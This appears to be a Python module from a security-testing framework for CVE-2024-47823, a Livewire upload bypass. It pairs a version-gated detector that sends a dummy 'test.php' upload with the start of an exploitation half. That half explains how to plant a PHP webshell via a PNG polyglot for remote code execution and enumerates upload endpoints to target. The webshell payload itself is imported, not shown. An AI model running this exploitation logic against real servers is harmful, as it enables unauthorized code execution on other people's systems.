#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-47823')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
modules/cves/cve_2024_47823.py

Improved Hybrid Livewire File Upload Bypass detector (CVE-2024-47823)

Features:
 - Detect Livewire presence via HTML heuristics (wire: attributes), script tags,
   known JS assets, and composer.lock.
 - Dynamically extract candidate mount points from HTML (script src, asset URLs)
   so it will find assets under /v2/, /v3/, /whatever/
 - Extract Livewire version from HTML/JS or composer.lock when available.
 - Classify version_status: 'vulnerable' / 'patched' / 'unknown'
 - Optionally perform a SAFE, non-destructive upload test that submits a
   harmless JPEG-like payload named "test.php" with MIME "image/jpeg" to
   candidate Livewire upload endpoints.
 - Probes multiple candidate endpoints and returns structured results.

Detection half — split from the original modules/cve_2024_47823.py.
The exploitation half lives at modules/cves/cve_2024_47823.py.

Usage:
    from modules.cves.cve_2024_47823 import scan
    result = scan("http://localhost:7070/v2", perform_upload_test=False)
"""

import re
import requests
from urllib.parse import urljoin, urlparse
from typing import Optional, Dict, List, Set

from modules.helpers.livewire_upload import fetch_component as _lw_fetch_component
from modules.core import http_config
from modules.generators.livewire_filemanager_endpoints import (
    FILEMANAGER_AUX_PATHS,
    FILEMANAGER_UPLOAD_PATHS,
    FILEMANAGER_COMPONENT_PATHS,
    ADMIN_REPORT_PATHS,
    CVE_2024_47823_EXTRA_PATH_HINTS,
    LIVEWIRE_UPLOAD_ENDPOINTS as GENERATOR_LIVEWIRE_UPLOAD_ENDPOINTS,
)
# Pure leaf helpers extracted to keep this file smaller (behavior-identical); re-imported
# so cve_2024_47823.<name> still resolves for callers and tests.
from modules.cves._cve_2024_47823_support import (  # noqa: F401
    LIVEWIRE_VERSION_PATTERN,
    _extract_version_from_livewire_js,
    _extract_version_from_text,
    _normalize_version_tuple,
    _is_version_vulnerable,
    _PNG_MAGIC,
    _WEBSHELL,
    _build_png_php_polyglot,
)

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Patterns & hints
SCRIPT_SRC_PATTERN = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
WIRE_HINTS = ("wire:", "wire:model", "wire:click", "livewire")

# A path segment with a filename extension is a FILE, not a mountable directory.
# Used to stop _candidate_bases_from_script from treating e.g. "jquery.min.js" as a
# probe base (which cross-products into /js/lib/jquery.min.js/livewire.js — the 84
# implausible requests that made this module fire 162/456 reqs on the :58443 lab).
_FILE_SEG_RE = re.compile(r'\.[A-Za-z0-9]{1,6}$')


def _looks_like_file_segment(seg: str) -> bool:
    return bool(_FILE_SEG_RE.search(seg))


def _looks_like_livewire_js(text: Optional[str]) -> bool:
    if not text:
        return False
    low = text.lower()
    return (
        "livewire" in low
        or "wire:" in low
        or "wire\\:" in low
        or "wire%3a" in low
    )


GOOD_STATUS = (200, 201, 202, 204)
# Common JS asset variations to try if explicit src scanning fails
COMMON_JS_HINTS = [
    "/livewire.js",
    "/livewire/livewire.js",
    "/vendor/livewire/livewire.js",
    "/_livewire/livewire.js",
    "/vendor/livewire/dist/livewire.js",
]
LIVEWIRE_UPLOAD_ENDPOINTS = list(dict.fromkeys(GENERATOR_LIVEWIRE_UPLOAD_ENDPOINTS + (
    "/livewire/message/upload",
    "/livewire/upload-file",
    "/upload/file",
    "/upload/image",
    "/upload-logo",
    "/upload_logo",
    "/files/upload",
    "/media/upload",
    "/admin/upload-logo",
    "/admin/files/upload",
    "/_livewire/message/upload",
    "/_livewire/message",
    "/livewire/message",
    "/admin/_livewire/message",
    "/admin/_livewire/message/upload",
    "/admin/livewire/message",
    "/admin/livewire/message/upload",
    "/api/media/upload",
    "/api/file/upload",
    "/admin/elfinder/file",
    "/admin/elfinder/elfinder.html",
    "/admin/file-manager/list",
    "/admin/filemanager/list",
)))

FILEMANAGER_LIKE_COMPONENT_PATHS = (
    *FILEMANAGER_COMPONENT_PATHS,
    *FILEMANAGER_UPLOAD_PATHS,
    *FILEMANAGER_AUX_PATHS,
)
LIVEWIRE_ROUTE_HINT_TOKENS = (
    "livewire",
    "upload",
    "uploads",
    "filemanager",
    "file-manager",
    "file-upload",
    "media",
    "ckfinder",
    "lfm",
    "backend",
    "laravel-file-manager",
    "media-library",
    "media_manager",
    "elfinder",
    "admin",
    "tran_es",
    "storage",
    "queue",
)


def _safe_get(url: str, sess=None, timeout: int = 6) -> Optional[requests.Response]:
    try:
        s = sess if sess is not None else http_config.get_auth_session()
        return s.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _probe_storage_php_execution_control(base: str, sess=None, timeout: int = 6):
    """Probe the web-tier control that makes uploaded PHP inert under /storage."""
    try:
        s = sess if sess is not None else http_config.get_auth_session()
        r = s.get(
            urljoin(base + "/", "storage/lvc-control-probe.php"),
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except Exception:
        return {"blocked": False, "state": "unknown"}
    return {"blocked": r.status_code in (401, 403), "status": r.status_code}


def _safe_post(url: str, sess=None, files=None, data=None, headers=None, timeout: int = 10) -> Optional[requests.Response]:
    try:
        s = sess if sess is not None else http_config.get_auth_session()
        return s.post(url, files=files, data=data, headers=headers, timeout=timeout, verify=False)
    except Exception:
        return None


def _normalize_base(u: str) -> str:
    if not u.startswith(("http://", "https://")):
        u = "http://" + u
    return u.rstrip("/")


def _extract_script_srcs(html: str) -> List[str]:
    if not html:
        return []
    return SCRIPT_SRC_PATTERN.findall(html)


def _url_join_allow_relative(base: str, path: str) -> str:
    # Handles absolute URLs and relative paths
    return urljoin(base + "/", path.lstrip("/"))


def _candidate_bases_from_script(src: str, page_base: str) -> List[str]:
    """
    Given a script src and page base, produce candidate mount bases to probe.
    E.g. src="/v2/vendor/livewire/livewire.js" -> base candidates:
      - https://host/v2
      - https://host/v2/vendor/livewire
      - https://host/v2 (parent)
    If src is absolute domain-scoped, we normalize to that domain.
    """
    try:
        parsed = urlparse(src)
    except Exception:
        return []
    candidates = []
    if parsed.scheme and parsed.netloc:
        # absolute URL. FP fix (audit 2026-06-05): only build probe bases from a
        # SAME-ORIGIN absolute src. A page that loads third-party CDN scripts
        # (e.g. <script src="https://cdn.tailwindcss.com">) must NOT have those hosts
        # turned into version-probe bases — doing so let the scanner fetch
        # cdn.tailwindcss.com/livewire.js and mis-scrape "3.0.0" off Tailwind's CDN
        # instead of the target's real (patched) Livewire. We keep same-host absolute
        # URLs (the target may legitimately reference its asset absolutely, e.g.
        # http://host/livewire-<hash>/livewire.js) and drop cross-host ones.
        try:
            page_host = urlparse(page_base).netloc
        except Exception:
            page_host = ""
        if page_host and parsed.netloc != page_host:
            return []  # cross-origin script — not a valid base for THIS target
        base_root = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        segments = path.strip("/").split("/")
        # Build progressive DIRECTORY candidates only. A file-like segment
        # (jquery.min.js, app.js, livewire.js) is not a mount base — stop there,
        # so we never produce /js/lib/jquery.min.js as a probe base.
        accum = ""
        for seg in segments:
            if _looks_like_file_segment(seg):
                break
            accum += f"/{seg}"
            candidates.append(base_root + accum)
    else:
        # relative path: base host + progressive path segments
        path = src
        if path.startswith("//"):
            # protocol-relative: prefix with page_base scheme
            pb = urlparse(page_base)
            page_base_root = f"{pb.scheme}://{pb.netloc}"
            path = page_base_root + path
            return [path.rstrip("/")]
        # build mount points: /v2, /v2/vendor, /v2/vendor/livewire etc.
        segments = path.strip("/").split("/")
        accum = ""
        pb = urlparse(page_base)
        page_base_root = f"{pb.scheme}://{pb.netloc}"
        for seg in segments:
            if _looks_like_file_segment(seg):
                break
            accum += f"/{seg}"
            candidates.append(page_base_root + accum)
    # ensure unique and keep order
    seen = set()
    out = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            out.append(c.rstrip("/"))
    return out


_IGNORED_STATIC_EXTENSIONS = {
    ".css",
    ".js",
    ".map",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".svg",
    ".woff",
    ".woff2",
    ".ttf",
    ".eot",
    ".webp",
    ".ico",
    ".pdf",
}


def _extract_route_map_from_kwargs(kwargs: Dict) -> Dict[str, Dict]:
    if not isinstance(kwargs, dict):
        return {}
    route_map = kwargs.get("route_map")
    if isinstance(route_map, dict):
        return route_map
    discovery = kwargs.get("discovery")
    if isinstance(discovery, dict):
        route_map = discovery.get("route_map")
        if isinstance(route_map, dict):
            return route_map
    return {}


def _is_static_asset(path: str) -> bool:
    low = (path or "").lower()
    return any(low.endswith(ext) for ext in _IGNORED_STATIC_EXTENSIONS)


def _looks_like_upload_surface(path: str) -> bool:
    low = (path or "").lower()
    if _is_static_asset(low):
        return False
    return any(token in low for token in LIVEWIRE_ROUTE_HINT_TOKENS)


def _path_parent(path: str) -> str:
    p = (path or "").rstrip("/")
    if not p or p == "/":
        return ""
    parent = "/".join(p.split("/")[:-1])
    return "/" + parent.lstrip("/") if parent else ""


def _candidate_upload_component_paths(route_map: Dict[str, Dict]) -> List[str]:
    # High-value paths seen during discovery.
    paths = ["/"]
    paths.extend(FILEMANAGER_LIKE_COMPONENT_PATHS)
    for path in route_map:
        if not isinstance(path, str):
            continue
        if not path.startswith("/"):
            continue
        if _looks_like_upload_surface(path):
            paths.append(path)
            parent = _path_parent(path)
            if parent:
                paths.append(parent)
    return _unique_preserve_order(paths)


def _probe_js_assets_from_bases(bases: List[str], sess=None, timeout: int = 6) -> Optional[Dict]:
    """
    Try to find a livewire.js (or similar) under candidate base URLs.
    Returns dict with keys {found: bool, base: str, text: str, path: str}
    """
    for base in bases:
        # Try known asset names (relative to the base)
        for hint in _unique_preserve_order(COMMON_JS_HINTS + ["/livewire.js"]):
            u = _url_join_allow_relative(base, hint)
            r = _safe_get(u, sess=sess, timeout=timeout)
            if (r is not None and r.status_code in GOOD_STATUS and r.text
                    and _looks_like_livewire_js(r.text)):
                return {"found": True, "base": base, "path": hint, "text": r.text, "url": u}
    return None


def _probe_composer_lock(base: str, sess=None, timeout: int = 6) -> Optional[Dict]:
    """Try /composer.lock for livewire package info."""
    u = _url_join_allow_relative(base, "/composer.lock")
    r = _safe_get(u, sess=sess, timeout=timeout)
    if r is None or r.status_code != 200:
        return None
    # Try JSON parse
    try:
        data = r.json()
    except Exception:
        text = r.text
        if "livewire/livewire" not in text:
            return None
        m = re.search(r'"name"\s*:\s*"livewire/livewire"[\s\S]{0,250}"version"\s*:\s*"([^"]+)"', text)
        if m:
            return {"name": "livewire/livewire", "version": m.group(1)}
        return None
    packages = data.get("packages", []) + data.get("packages-dev", [])
    for pkg in packages:
        if pkg.get("name") == "livewire/livewire":
            return pkg
    return None


def _perform_safe_upload_test(base: str, endpoint: str, sess=None, timeout: int = 10) -> Optional[Dict]:
    url = _url_join_allow_relative(base, endpoint)
    payload = b"\xFF\xD8\xFF\xE0FakeJPEGHeader"  # harmless JPEG header bytes
    files = {"file": ("test.php", payload, "image/jpeg")}
    r = _safe_post(url, sess=sess, files=files, timeout=timeout)
    if r is None:
        return None
    return {
        "endpoint": url,
        "http_status": r.status_code,
        "bypass_successful": r.status_code in (200, 201, 202),
        "response_snippet": (r.text[:600] if r.text else ""),
    }


def _find_reachable_upload_component(
    base: str,
    candidate_bases: List[str],
    sess=None,
    route_map=None,
    timeout: int = 6,
) -> Optional[Dict]:
    """Return the URL of the first reachable public Livewire-3 upload component, else None.

    Uses the shared cookie-XSRF-aware fetch_component so it sees components that render no
    <meta csrf-token> (livewire-filemanager). Probes the common public upload routes plus
    the discovered candidate bases. A hit is first-hand evidence the upload surface is
    reachable — stronger than a scraped version string. Read-only: GET only, no upload.
    """
    s = sess if sess is not None else http_config.get_auth_session()
    seen: Set[str] = set()
    upload_paths = (
        "",
        "/upload",
        "/uploads",
        "/upload-logo",
        "/upload_logo",
        "/upload-file",
        "/filemanager",
        "/file-upload",
        "/files",
        "/media",
        "/admin/upload",
        "/admin/file-upload",
        "/admin/filemanager/upload",
        "/admin/file-manager/upload",
        "/admin/media-manager/upload",
        "/admin/media/upload",
        "/admin/elfinder/connector",
        "/admin/queue",
        "/admin/queue/monitor",
        "/admin/storage-link",
        "/admin/storage/link",
        "/admin/tran_es/report",
        "/admin/tran_es/report.html",
        "/admin/ckfinder/ckfinder.html",
        "/vendor/ckfinder/ckfinder.html",
        "/admin/laravel-filemanager/upload",
        "/admin/laravel-file-manager/upload",
        "/api/upload",
        "/api/v1/upload",
        "/api/v1/company/upload-logo",
        *FILEMANAGER_AUX_PATHS,
        *ADMIN_REPORT_PATHS,
        *CVE_2024_47823_EXTRA_PATH_HINTS,
        "/admin/livewire/message",
        "/admin/_livewire/message",
        "/admin/livewire/message/upload",
        "/admin/_livewire/message/upload",
        "/_livewire/message",
        "/_livewire/message/upload",
        "/livewire/message",
        "/livewire/message/upload",
    )
    route_paths = _candidate_upload_component_paths(route_map or {})
    roots = [base] + [c for c in candidate_bases if c] + [urljoin(base + "/", p.lstrip("/")) for p in route_paths]
    for root in roots:
        if not root:
            continue
        for path in upload_paths:
            url = root if path == "" else urljoin(root + "/", path.lstrip("/"))
            if url in seen:
                continue
            seen.add(url)
            try:
                comp = _lw_fetch_component(s, url, timeout=timeout)
            except Exception:
                comp = None
            if comp:
                return comp
    return None


def _unique_preserve_order(seq: List[str]) -> List[str]:
    seen: Set[str] = set()
    out: List[str] = []
    for s in seq:
        if s not in seen:
            seen.add(s)
            out.append(s)
    return out


def scan(target_url: str, *, session=None, username=None, password=None, perform_upload_test: bool = False, timeout: int = 6, **kwargs) -> Optional[Dict]:
    """
    Main scanner function.

    Args:
        target_url: e.g., "http://localhost:7070/v2" or "http://example.com"
        session: optional pre-authenticated requests.Session (operator-supplied)
        username: optional username for self-login (unused — module is stateless)
        password: optional password for self-login (unused — module is stateless)
        perform_upload_test: only perform upload if version is detected vulnerable
        timeout: request timeout for probes

    Returns:
        dict (see below) or None when Livewire not detected.

    Returned dict keys:
      - livewire_found (bool)
      - vulnerable (bool)            # authoritative verdict (version_status == 'vulnerable')
      - version (str|None)
      - version_status ('vulnerable'|'patched'|'unknown')
      - detection_methods (list[str])
      - probed_bases (list[str])
      - upload_test_performed (bool)
      - upload_bypass (bool)         # optional active-probe result, NOT the verdict
      - upload_endpoint (str|None)
      - details (list of attempt dicts)
    """
    sess = session or http_config.get_auth_session()
    base = _normalize_base(target_url)
    route_map = _extract_route_map_from_kwargs(kwargs)
    result: Dict = {
        "livewire_found": False,
        # Explicit verdict key the check.py driver (_is_positive_finding) reads directly.
        # Set True only once version_status resolves to "vulnerable" (Step 7). Without this,
        # the driver fell back to scanning every "<thing>_detected" key — and upload_bypass
        # (below) is a SECONDARY signal that stays False whenever the upload test is skipped
        # (e.g. the sink is behind auth, as in the ERPSAAS 37004 lab), which mislabeled a
        # genuinely vulnerable target as "not detected".
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "detection_methods": [],
        "probed_bases": [],
        "upload_test_performed": False,
        # Renamed from "upload_bypass_detected": the "_detected" suffix collided with the
        # driver's generic negative-marker heuristic. This is the active-upload-probe result,
        # not the detection verdict; the verdict lives in "vulnerable"/"version_status".
        "upload_bypass": False,
        "upload_endpoint": None,
        "details": [],
        "artifacts": {},
    }

    # Step 1: fetch the main page (and follow redirects)
    resp = _safe_get(base, sess=sess, timeout=timeout)
    page_html = resp.text if resp is not None and resp.status_code in GOOD_STATUS else ""

    # Step 2: quick heuristic (wire: ...)
    if page_html and any(h in page_html.lower() for h in WIRE_HINTS):
        result["livewire_found"] = True
        result["detection_methods"].append(f"html_wire_hint:{base}")

    # Step 3: extract script srcs from the HTML and produce candidate bases
    script_srcs = _extract_script_srcs(page_html)
    candidate_bases = []
    for src in script_srcs:
        # produce candidate bases from script src
        cands = _candidate_bases_from_script(src, base)
        candidate_bases.extend(cands)
    # Add some default fallbacks: /v2, /v3, root
    candidate_bases.extend([base, base + "/v2", base + "/v3"])
    # Normalize and dedupe
    candidate_bases = _unique_preserve_order([c.rstrip("/") for c in candidate_bases if c])
    result["probed_bases"] = candidate_bases

    # Step 4: Probe JS assets under candidate bases for livewire JS. This confirms Livewire is
    # present and yields a FALLBACK version from the bundled asset banner — but the asset version
    # (the shipped livewire.js build) can differ from the composer-pinned package version, so it is
    # NOT authoritative for the version gate. Record it only as a fallback (Step 5 may override).
    js_probe = _probe_js_assets_from_bases(candidate_bases, sess=sess, timeout=timeout)
    js_fallback_version = None
    if js_probe:
        result["livewire_found"] = True
        result["detection_methods"].append(f"js_asset:{js_probe.get('url')}")
        js_fallback_version = _extract_version_from_text(js_probe.get("text"))
        # record base
        if js_probe.get("base") not in result["probed_bases"]:
            result["probed_bases"].append(js_probe.get("base"))

    # Step 5: composer.lock is the AUTHORITATIVE version source (it pins the actual
    # livewire/livewire package version; the lab README designates it the auth-independent signal).
    # Always probe it and let it OVERRIDE the JS-asset banner — the prior code only consulted it
    # when the JS scrape found nothing (`if not result["version"]`), so a misleading bundled-asset
    # banner silently flipped a vulnerable target to "patched" (live FAIL on :37004, livewire 2.12.5).
    for cand in candidate_bases:
        pkg = _probe_composer_lock(cand, sess=sess, timeout=timeout)
        if pkg:
            result["livewire_found"] = True
            result["detection_methods"].append(f"composer_lock:{cand}")
            ver = pkg.get("version") or (pkg.get("dist") or {}).get("version")
            if ver:
                result["version"] = ver.lstrip("v")   # authoritative — wins over the JS banner
            break

    # Fall back to the JS-asset banner version only if composer.lock yielded no package version.
    if not result["version"] and js_fallback_version:
        result["version"] = js_fallback_version

    # Step 6: If still not found, but HTML had wire hints, mark found (heuristic)
    if not result["livewire_found"] and page_html and any(h in page_html.lower() for h in WIRE_HINTS):
        result["livewire_found"] = True
        result["detection_methods"].append("html_heuristic_only")

    if not result["livewire_found"]:
        return None

    # Step 7: determine version status
    if result["version"]:
        is_vuln = _is_version_vulnerable(result["version"])
        if is_vuln is True:
            result["version_status"] = "vulnerable"
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            control = _probe_storage_php_execution_control(base, sess=sess, timeout=timeout)
            result["artifacts"]["storage_php_control_probe"] = control
            result["detection_methods"].append("storage_php_control_probe")
            if control.get("blocked"):
                result["version_status"] = "vulnerable version, storage PHP execution denied"
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "upload_execution_control"
        elif is_vuln is False:
            result["version_status"] = "patched"
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
        else:
            result["version_status"] = "unknown"
    else:
        result["version_status"] = "unknown"

    # A vulnerable Livewire version is applicability evidence only. A confirmed CVE verdict
    # requires the optional safe upload-bypass proof below.
    result["vulnerable"] = False

    # Step 7b: reachable-upload-component evidence path. A directly reachable public
    # Livewire-3 upload component is recorded as supporting evidence (it resolves CSRF
    # from the XSRF-TOKEN cookie, so it sees components that render no <meta csrf-token>).
    #
    # FP fix (audit 2026-06-05): CVE-2024-47823 is a VERSION-BOUND validation-bypass
    # (Livewire v2<2.12.7 / v3<3.5.2). A reachable upload component ALONE is NOT evidence
    # of *this* CVE — it can be:
    #   (a) a PATCHED Livewire (e.g. 3.15.12) where there is no temp-file validation to
    #       bypass — flipping vulnerable=True here was the cross-target false positive; or
    #   (b) the livewire-filemanager unrestricted-upload sink, which is the CVE-2025-14894
    #       finding (no MIME validation to bypass there) — reporting it under 47823 too
    #       double-counts the same sink.
    # So the reachable component NEVER upgrades the verdict on its own. The authoritative
    # 47823 verdict stays the version gate (result["vulnerable"] set in Step 7); when the
    # version is patched, or unknown with only a reachable component, we DEFER to
    # CVE-2025-14894 and leave vulnerable=False.
    # Route-map route-hints can provide stronger page probes for livewire upload sinks.
    candidate_bases = _unique_preserve_order(
        candidate_bases + [urljoin(base + "/", p.lstrip("/")) for p in _candidate_upload_component_paths(route_map)]
    )
    result["probed_bases"] = _unique_preserve_order(result["probed_bases"] + [c for c in candidate_bases if c])

    # Step 7b is an ACTIVE corroboration probe (it walks candidate upload-component pages over the
    # network). It is supporting evidence ONLY — the authoritative verdict is the version gate set
    # above (line ~647) and never depends on it. Gate it behind perform_upload_test like Step 8:
    # on a live target this probe can block for a long time on unresponsive component endpoints, and
    # since it cannot change the verdict there is no reason to pay that cost in a detect-only run.
    reachable = _find_reachable_upload_component(
        base,
        candidate_bases,
        sess=sess,
        route_map=route_map,
        timeout=timeout,
    ) if perform_upload_test else None
    if reachable:
        result["livewire_found"] = True
        upload_url = reachable.get("page_url") if isinstance(reachable, dict) else str(reachable)
        result["upload_component_url"] = upload_url
        result["detection_methods"].append(f"upload_component:{upload_url}")
        result["artifacts"] = {
            "livewire_upload_component": reachable,
            "upload_component_url": upload_url,
            "livewire_update_url": reachable.get("update_url") if isinstance(reachable, dict) else None,
        }
        if result["version_status"] == "patched":
            result["note"] = (
                "reachable public Livewire upload component, but the Livewire version is "
                "PATCHED (>= 3.5.2 / 2.12.7) — no temp-file validation to bypass, so this is "
                "NOT CVE-2024-47823. If it is the livewire-filemanager sink it is reported by "
                "CVE-2025-14894 (unrestricted upload)."
            )
        elif not result["vulnerable"]:
            # Version is unknown (no vulnerable-version evidence). A reachable component
            # is not, by itself, proof of the 47823 bypass — defer to CVE-2025-14894
            # rather than asserting this version-bound CVE on a heuristic.
            result["note"] = (
                "reachable public Livewire upload component but no vulnerable-version "
                "evidence for CVE-2024-47823; if this is the livewire-filemanager sink it "
                "is reported by CVE-2025-14894 (unrestricted upload — no MIME validation "
                "to bypass there). Not asserting 47823 on a reachable component alone."
            )
        else:
            # Version already resolved as vulnerable in Step 7 — the reachable component is
            # corroborating first-hand evidence of the (genuinely) affected upload surface.
            result["note"] = (
                "reachable public Livewire upload component corroborates the vulnerable "
                "Livewire version (CVE-2024-47823 temp-file validation bypass)."
            )

    # Step 8: Optionally perform safe upload test if version is vulnerable
    if perform_upload_test and result["version_status"] == "vulnerable":
        result["upload_test_performed"] = True
        upload_tests = []
        # Existing route-agnostic guesses plus route-derived route-path candidates.
        for cand in candidate_bases:
            for ep in LIVEWIRE_UPLOAD_ENDPOINTS:
                upload_tests.append((cand, ep))
        for ep in LIVEWIRE_UPLOAD_ENDPOINTS:
            # direct candidates for routes that advertise file upload in their path.
            for path in _candidate_upload_component_paths(route_map):
                upload_tests.append((urljoin(base + "/", path.lstrip("/")), ep))
        for cand, ep in upload_tests:
            t = _perform_safe_upload_test(cand, ep, sess=sess, timeout=timeout)
            if t is None:
                # attempt next
                continue
            # store attempt
            attempt = {
                "base": cand,
                "endpoint": ep,
                "http_status": t["http_status"],
                "bypass_successful": t["bypass_successful"],
            }
            result["details"].append(attempt)
            if t["bypass_successful"]:
                result["upload_bypass"] = True
                result["upload_endpoint"] = t["endpoint"]
                result["vulnerable"] = True
                result["status"] = "confirmed_vulnerable"
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "safe_active"
                return result

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-47823 exploitation half — Livewire < 3.5.2 file-upload validation bypass RCE.

Split from the original modules/cve_2024_47823.py (detection half:
modules/cves/cve_2024_47823.py). Exploitation may import from modules root
(shared infra) and modules.detection.

Root cause (GHSA-f3cx-396f-7jqp): Livewire's TemporaryUploadedFile derives the
uploaded file's extension from its MIME type via guessExtension() rather than
the real client extension. A file sent with MIME image/png but named shell.php
therefore "looks like" a png to Livewire. When the application stores it under
getClientOriginalName() on a public storage disk (the precondition the advisory
names), shell.php lands at storage/app/public/shell.php, is exposed via
storage:link at /storage/shell.php, and Apache + mod_php executes it -> RCE.
"""

import re
import html
import json
import struct
import time
import uuid
import zlib
import requests
from urllib.parse import urljoin, urlparse
from typing import Optional, Dict

from modules.core import http_config
from modules.helpers.livewire_upload import (
    fetch_component as lw_fetch_component,
    ensure_current_folder as lw_ensure_current_folder,
    lw3_upload,
)
from modules.generators.livewire_filemanager_endpoints import (
    FILEMANAGER_COMPONENT_PATHS,
    FILEMANAGER_UPLOAD_PATHS,
    FILEMANAGER_AUX_PATHS,
    ADMIN_REPORT_PATHS,
    CVE_2024_47823_EXTRA_PATH_HINTS,
)

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Public upload pages to probe for the Livewire component (static baseline list).
#
# These are conservative, high-coverage defaults used when no route/map artifacts exist.
# Detection-derived route hints and direct detection artifact routes are now merged in
# _candidate_upload_paths(), so we keep this list intentionally compact.
_UPLOAD_PATHS = (
    "/",
    "/admin",
    *FILEMANAGER_COMPONENT_PATHS,
    *FILEMANAGER_UPLOAD_PATHS,
    *FILEMANAGER_AUX_PATHS,
    *ADMIN_REPORT_PATHS,
    *CVE_2024_47823_EXTRA_PATH_HINTS,
    "/admin/livewire/message",
    "/admin/_livewire/message",
    "/admin/livewire/message/upload",
    "/admin/_livewire/message/upload",
    "/admin/elfinder/elfinder.html",
    "/admin/report",
    "/admin/report.html",
    "/admin/reports",
    "/admin/reports.html",
    "/admin/queue/list",
    "/admin/queue/failed",
)

def _dedupe(seq):
    seen = set()
    out = []
    for item in seq:
        if item in seen:
            continue
        seen.add(item)
        out.append(item)
    return out


def _candidate_upload_paths(base_url: str, route_map=None, detection=None, detection_artifacts=None,
                           probe_hint=None):
    """Build detection-aware probe paths, reusing detector artifacts before generic probing.

    Priority:
    1) explicit operator path hint (if `check.py` passed a non-root path),
    2) direct detection artifacts (upload_component_url / component payload),
    3) route-derived path hints from discovery,
    4) static baseline defaults.
    """
    base = base_url.rstrip("/") if base_url else ""
    parsed = urlparse(base)
    root = f"{parsed.scheme}://{parsed.netloc}"
    route_map = route_map or {}

    candidate_paths = []
    candidate_urls = []
    if probe_hint and probe_hint != "/":
        candidate_paths.append(probe_hint)

    artifacts = {}
    if isinstance(detection_artifacts, dict):
        artifacts.update(detection_artifacts)
    if isinstance(detection, dict):
        artifacts.update(detection.get("artifacts", {}) or {})

    def _push_path(value):
        if not value:
            return
        p = str(value)
        if p.startswith("http://") or p.startswith("https://"):
            try:
                p_parsed = urlparse(p)
                if p_parsed.path:
                    candidate_paths.append(p_parsed.path or "/")
            except Exception:
                return
        else:
            candidate_paths.append(p)

    # Direct artifact hints from detections.
    _push_path(artifacts.get("upload_component_url"))
    comp = artifacts.get("livewire_upload_component")
    if isinstance(comp, dict):
        _push_path(comp.get("page_url"))
        _push_path(comp.get("update_url"))
    _push_path(artifacts.get("filemanager_url"))
    comp = artifacts.get("filemanager_component")
    if isinstance(comp, dict):
        _push_path(comp.get("page_url"))
        _push_path(comp.get("update_url"))
        _push_path(comp.get("filemanager_path"))

    # Route-map route hints discovered by detect-lifecycle preflight.
    for p in _candidate_upload_component_paths(route_map):
        candidate_paths.append(p)

    # Static fallback list for broad, no-map runs.
    candidate_paths.extend(_UPLOAD_PATHS)

    # Normalize and dedupe.
    for p in _dedupe(candidate_paths):
        if p == "/":
            candidate_urls.append(root)
        elif p.startswith("http://") or p.startswith("https://"):
            candidate_urls.append(p)
        else:
            candidate_urls.append(urljoin(root + "/", p.lstrip("/")))

    # Keep final dedupe for malformed route-map artifacts.
    return _dedupe(candidate_urls)

# PNG magic header so MIME sniffing (and Livewire's guessExtension()) classify the
# bytes as image/png -- that is the validation bypass. PHP still executes the
# trailing <?php ... ?> block when the file is served as .php.


# The sibling CVE the unauth fallback actually demonstrates on a PATCHED Livewire:
# the livewire-filemanager unrestricted-upload sink (same /storage RCE, but no
# MIME-validation to bypass — that's what 47823 *is*).
_FILEMANAGER_CVE = "CVE-2025-14894"


def _attribution_for_fallback_success(
    version_status: Optional[str],
    *,
    filemanager_sink: bool = False,
) -> Optional[dict]:
    """Decide whether an unauth-fallback RCE win should be RE-ATTRIBUTED away from 47823.

    The unauth path (sweep public Livewire upload routes -> drop a .php -> /storage)
    succeeds whenever ANY reachable Livewire upload sink accepts the file. On a target
    whose Livewire is PATCHED against 47823 (>= 3.5.2 / 2.12.7), there is no temp-file
    MIME-validation left to bypass, so the win is NOT 47823 — it is the
    livewire-filemanager unrestricted-upload sink, i.e. CVE-2025-14894 (same sink, same
    /storage RCE). Re-attribute so the headline/summary name the bug that was actually
    proven, not the version-bound CVE whose own detector said "not detected".

    Pure decision (no I/O) so it is unit-testable. Returns:
      * a dict {cve, outcome, outcome_tag} when the win should be re-attributed, or
      * None to KEEP the native CVE-2024-47823 attribution.

    Re-attribute when the version is confidently PATCHED, or when the reached component
    is visibly the livewire-filemanager sink. A generic unknown-version upload page can
    still plausibly be the genuine 47823 bypass, so that stays native 47823.
    """
    if version_status == "patched" or (version_status in (None, "unknown") and filemanager_sink):
        return {
            "cve": _FILEMANAGER_CVE,
            "outcome": f"EXPLOITED via livewire-filemanager unrestricted upload "
                       f"(reported as {_FILEMANAGER_CVE})",
            "outcome_tag": f"exploited-as {_FILEMANAGER_CVE}",
        }
    return None


def _looks_like_filemanager_sink(component: Dict) -> bool:
    haystack = " ".join([
        str((component or {}).get("page_url", "")),
        str((component or {}).get("snapshot", "")),
    ]).lower()
    return "filemanager" in haystack or "file-manager" in haystack

# ---------------------------------------------------------------------------
# Livewire-2 paths (the local 37001 lab is public/unauth; ERPSAAS also has an
# older authenticated Filament sink that remains as a fallback for seeded-lab and
# real-app testing).
#
# The current ERPSAAS lab ships Livewire 2.12.5 and parks the vulnerable FileUpload
# behind the Filament admin login. The LW2 protocol is different enough from the LW3
# public upload flow that this branch implements the LW2 message protocol against
# the authenticated Company-settings logo FileUpload. See modules/cves/cve_2024_47823.py
# for the version gate.
# ---------------------------------------------------------------------------

# Login is a classic filament-companies POST form at /login (NOT /company/login).
_LOGIN_PATH = "/login"
